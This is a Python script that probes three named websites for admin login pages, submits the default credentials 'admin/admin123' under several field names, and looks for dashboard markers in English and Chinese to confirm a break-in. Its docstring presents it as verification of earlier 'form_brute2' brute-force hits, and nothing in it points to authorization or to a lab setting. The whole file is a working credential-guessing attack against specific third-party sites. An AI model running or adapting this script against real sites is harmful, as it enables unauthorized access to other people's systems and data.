#!/usr/bin/env python3
"""STRICT verify 3 form_brute2 hits - cookie + backend markers"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["http://diya-log.com", "http://www.cloudanswers.com", "http://www.eltoutcomes.com"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

BACKEND_MARKERS = ["dashboard", "wp-admin", "logout", "退出", "系统设置", "后台首页",
                   "content management", "admin_bar", "wp-admin-bar", "控制面板", "管理首页"]

for site in SITES:
    print("=== %s ===" % site, flush=True)
    op, cj = get_opener()
    # find login form
    found = False
    for p in ["/admin/login", "/admin/", "/login.php", "/admin/login.php", "/wp-login.php"]:
        code, final, body = fetch(op, site + p)
        if "password" in body.lower() or "密码" in body:
            print("  login at %s: %s size=%d" % (p, code, len(body)), flush=True)
            # post admin/admin123
            data = urllib.parse.urlencode({"username": "admin", "password": "admin123",
                                           "user_login": "admin", "user_pass": "admin123",
                                           "log": "admin", "pwd": "admin123"})
            code, final, body = fetch(op, site + p, data=data, referer=site + p)
            # check backend
            markers = [m for m in BACKEND_MARKERS if m in body.lower()]
            print("  after login: code=%s final=%s markers=%s size=%d" % (code, final[:50], markers[:5], len(body)), flush=True)
            if markers:
                # try dashboard
                for dp in ["/admin/index.php", "/wp-admin/", "/admin/", "/dashboard"]:
                    c2, f2, b2 = fetch(op, site + dp)
                    m2 = [m for m in BACKEND_MARKERS if m in b2.lower()]
                    if m2:
                        print("  !!! CONFIRMED at %s: markers=%s" % (dp, m2[:5]), flush=True)
                        found = True
                        break
            break
    if not found:
        print("  NOT confirmed", flush=True)
